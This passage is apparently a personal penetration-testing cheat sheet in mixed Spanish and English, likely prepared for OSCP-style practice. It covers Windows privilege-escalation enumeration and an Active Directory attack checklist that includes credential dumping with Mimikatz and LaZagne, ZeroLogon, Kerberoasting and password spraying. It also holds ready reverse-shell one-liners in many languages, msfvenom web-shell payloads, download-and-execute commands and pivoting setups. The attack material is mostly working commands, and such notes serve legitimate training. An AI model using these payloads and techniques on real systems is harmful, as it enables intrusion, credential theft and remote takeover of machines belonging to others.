- [ ] net localgroup Administrators
- [ ] net share ("w:")
- [ ] ipconfig /all
- [ ] route print
- [ ] arp -a
- [ ] arp -d
- [ ] arp -A
- [ ] netstat -ano
- [ ] type C:\WINDOWS\System32\drivers\etc\hosts
- [ ] netsh firewall show state
- [ ] netsh firewall show config
- [ ] schtasks /query /fo LIST /v
- [ ] tasklist
- [ ] tasklist /SVC

```bash
SharpUp.exe
PowerUp.ps1
Winpeas.exe
LaZagne.exe
Rubeus.exe	
Mimikatz.exe
```

- Service Binary Hijacking

SharpUp.exe audit

PowerUp.ps1 Invoke-AllChecks

`net stop "name process"`

`net start "name process"`

`Start-Service -Name "name process"`

`stop-Service -Name "name process"`

`shutdown /r /t 0`

- Service DLL Hijacking

PATH

`$env:path`

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

- Unquoted Service Paths

SharpUp.exe audit

`wmic service get name,pathname`

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName wmic service get name,pathname`

`icacls "C:\Program Files"`

- Scheduled Tasks

`schtasks /query /fo LIST /v`

- Using Exploits

- library hijacking

- Binaries

https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/

---

### DIRECTORIO ACTIVO

- Emum

```bash
net user /domain
net user jeffadmin /domain
net group /domain
net group "name group" /domain
```

#### Checklist Active Directory

- [ ] Dump creds mimikatz and secretsdump.
- [ ] Dump cached mimikatz credentials.
- [ ] Dump autologon credentials mimikatz
- [ ] Dump creds with LaZagne.exe
- [ ] Test ZeroLogon exploit against the DC
- [ ] ATTENTION TO PHPINFO
- [ ] Enumerate local files.
    - [ ] PowerShell history
    - [ ] Windows.old
    - [ ] Databases
    - [ ] WinPEAS
    - [ ] .kdbx files
- [ ] Test users against all services on all machines.
    - [ ] SMB
    - [ ] RDP
    - [ ] WINRM
    - [ ] MSSQL
    - [ ] SSH
- [ ] List and abuse Kerberoastable or ASP REP roastable users.
- [ ] Test local administrator user of a machine on the other machines of the domain.
- [ ] List and abuse ACLs (BloodHound).
- [ ] Test password spraying.

- PowerView.ps1
```
  - Get-NetDomain

  - Get-NetDomain

  - Get-NetUser | select cn

  - Get-NetGroup | select cn

  - Get-NetComputer

  - Get-NetComputer | select operatingsystem,dnshostname

  - Find-DomainShare
```

- Collecting Data with SharpHound

```
Import-Module .\Sharphound.ps1
Get-Help Invoke-BloodHound
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

---

## SHELL

https://www.revshells.com/

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Bash

```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

### Perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```

### Ruby

```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```

### Netcat

#### Linux

```nc -e /bin/sh 10.0.0.1 1234```

```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```

#### Windows

```nc -e cmd.exe 10.11.1.111 4443```

### Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Msfvenom
		
	- Windows
			- `msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT –f exe > /root/Desktop/reverse.exe`
			- `msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$IP LPORT=$PORT -e x86/shikata_ga_nai -f exe -o reverse.exe`
			- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f exe -o reverse.exe`

	- Web Payloads

		- PHP
			- `msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > shell.php`
			- `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`

		- ASP
			- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f asp > shell.asp`

		- JSP
			- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f raw > shell.jsp`

		- WAR
			- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war > shell.war`

### Windows

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### TTY

  - `stty raw -echo`

  - `script /dev/null -c bash`

Ctr+Z

  - `stty raw -echo;fg`

  - `reset xterm`

  - `export TERM=xterm`

  - `export SHELL=bash`

---

## TRANSFERENCIA DE ARCHIVOS 

https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/

### LINUX

- nc

		- victim machine:

		nc -lvp 4444 > FiletoDownload

		- kali:

		nc IP 4444 -w 3 < FiletoDownload

- web

```wget http://IP/FiletoTransfer```

```curl -o FiletoTransfer http://IP/FiletoTr```

- ssh

```scp FiletoTransfer user@IP:/home/user```

### WINDOWS

- nc

		- victim machine:

		nc.exe -lvp 4444 > FiletoTransfer

		- kali

		nc IP 4444 -w 3 < FiletoTransfer

- web

```curl http://IP/chisel.exe -o C:\Windows\Temp\chisel.exe```

```certutil.exe -urlcache -split -f http://IP/mimikatz64.exe C:\Windows\Temp\mimikatz64.exe```

```iex (New-Object Net.WebClient).DownloadString('http://IP/ps.ps1’);```

```iwr -uri http://IP/ps.ps1 -OutFile ps.ps1```

```powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://IP/FiletoTransfer','C:\Users\test\Desktop\FiletoTransfer')"```


- smb

`impacket-smbserver -smb2support test .`

`copy \\IP\test\FiletoTransfer FiletoTransfer`

- ssh

```scp ./PsExec64.exe user@IP:C:/Users/user/Downloads/psexec.exe```

---

## PIVOTING

### ligolo-ng

https://github.com/nicocha30/ligolo-ng

- kali:

		sudo ip tuntap add user kali mode tun ligolo

		sudo ip link set ligolo up

		sudo ip route add 10.10.89.0/24 dev ligolo

		./proxy -selfcert

- victim machine:

upload agent.exe

		.\agent.exe -connect IPkali:11601 -ignore-cert

- then ligolo-ng:

		session

		1

		start

### chisel

https://github.com/jpillora/chisel

https://deephacking.tech/pivoting-con-chisel/

#### Linux

- kali

		./chisel_1.8.1_linux_amd64 server --reverse -p 1234

- linux

		./chisel_1.8.1_linux_amd64 client IPkali:1234 R:socks

#### Windows

- kali

		./chisel_1.8.1_linux_amd64 server --reverse -p 1234

- Windows

		chisel.exe  client IPkali:1234 R:1080:socks

		chisel.exe  client IPkali:1234 R:910:127.0.0.1:910

### Proxychains



https://github.com/haad/proxychains

`proxychains nmap -sT 127.0.0.1 -p80,81,3306`

`proxychains mysql -h 127.0.0.1 -u root`

`proxychinas nc 127.0.0.1. 31337`

***CHECK!! /etc/proxychains4.conf***

### Extra

pivoting theory

https://artkond.com/2017/03/23/pivoting-guide/

https://github.com/rofl0r/proxychains-ng

https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide

---

## EXTRA LINKS


- [HackTricks Book](https://book.hacktricks.xyz/welcome/readme)

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings):

- [revshells](https://www.revshells.com/)

- [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

- [gtfobins](https://gtfobins.github.io/)

- [lolbas-project](https://lolbas-project.github.io/#)

- [crackstation](https://crackstation.net/)

- [urldecoder](https://www.urldecoder.org/)

- [cyberchef](https://cyberchef.org/)

- [lagarian.smith/oscp-cheat-sheet](https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP_Notes.md)

- [Sp4c3Tr4v3l3r/OSCP](https://github.com/Sp4c3Tr4v3l3r/OSCP/tree/main)

---
 
<!-- Esto es un comentario --> 
<!--  
Encabezados:
# Encabezado 1
## Encabezado 2
### Encabezado 3

# Texto en negrita y cursiva:

**Negrita**

*Cursiva*

***Negrita y cursiva***

# Listas:

- Elemento de lista
  - Elemento anidado
 
1. Elemento numerado
2. Elemento numerado 2

# Enlaces:

[Texto del enlace](URL)

# Imágenes:

![Texto alternativo](URL de la imagen)
# Citas:

> Esto es una cita.

# Código en línea:

`código en línea`

# Bloques de código:

```lenguaje
Código aquí
```

# Línea horizontal:

---
se ha metido una linea horizontal

# Tablas:

| Encabezado 1 | Encabezado 2 |
|--------------|--------------|
| Celda 1      | Celda 2      |

# Menciones a usuarios o problemas:

@nombreusuario
#123 (número de problema)

# Checkboxes:

- [x] Tarea completada
- [ ] Tarea pendiente

# Listas de tareas:

- [ ] Tarea pendiente
  - [ ] Subtarea pendiente
- [x] Tarea completada

# Comentarios en HTML:

<!-- Esto es un comentario 
Se ha escrito un comentario pero no se ve quitar el "-" entre "<-!" ;;; <-!-- Esto es un comentario
---
---

$IP

$PORT

`comandos`

> CLI input o comentarios

- [Fixing Exploits](https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Basics.md#fixing-exploits)
- [Linux](https://github.com/Sp4c3Tr4v3l3r/OSCP/blob/main/Basics.md#linux)
* [RECON](#RECON)
* [ENUMERACION_ACTIVA](#ENUMERACION_ACTIVA)

-->

<!-- Esto es un comentario -->
